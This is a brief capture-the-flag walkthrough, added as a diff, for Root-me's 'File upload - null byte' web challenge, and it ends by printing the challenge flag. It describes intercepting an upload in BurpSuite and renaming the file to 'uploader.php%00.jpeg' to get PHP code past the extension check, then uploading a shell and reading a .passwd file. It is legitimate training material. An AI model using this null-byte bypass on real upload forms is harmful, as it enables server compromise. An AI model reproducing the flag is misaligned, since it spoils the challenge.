@@ -1,0 +1,41 @@
+Video Solution: https://youtu.be/Q8MpcKPoegw
+Task on Root-me: https://www.root-me.org/en/Challenges/Web-Server/File-upload-null-byte
+
+http://challenge01.root-me.org/web-serveur/
+
+Your goal is to hack this photo galery by uploading PHP code.
+	
+Upload script to this url	
+	
+	http://challenge01.root-me.org/web-serveur/ch22/?action=upload
+	
+Grub file from task file-upload-MIME-type   uploader.php.jpeg and try to upload
+	
+File information :
+
+    Upload: uploader.php.jpeg
+    Type: image/jpeg
+    Size: 0.225390625 kB
+    Stored in: ./galerie/upload/3gq39tn3ogd9fd6ugcfn64jga5/uploader.php
+
+Wrong file name !
+
+Open BurpSuite and intercept POST, then replace file name to this uploader.php%00.jpeg
+	
+File information :
+
+    Upload: uploader.php%00.jpeg
+    Type: image/jpeg
+    Size: 0.225390625 kB
+    Stored in: ./galerie/upload/3gq39tn3ogd9fd6ugcfn64jga5/uploader.php
+
+File uploaded.
+go to link and upload shell
+   /galerie/upload/3gq39tn3ogd9fd6ugcfn64jga5/upload.php 
+
+then find .passwd file
+
+Well done ! You can validate this challenge with the password : YPNchi2NmTwygr2dgCCF
+This file is already deleted.
+	
+Flag : YPNchi2NmTwygr2dgCCF
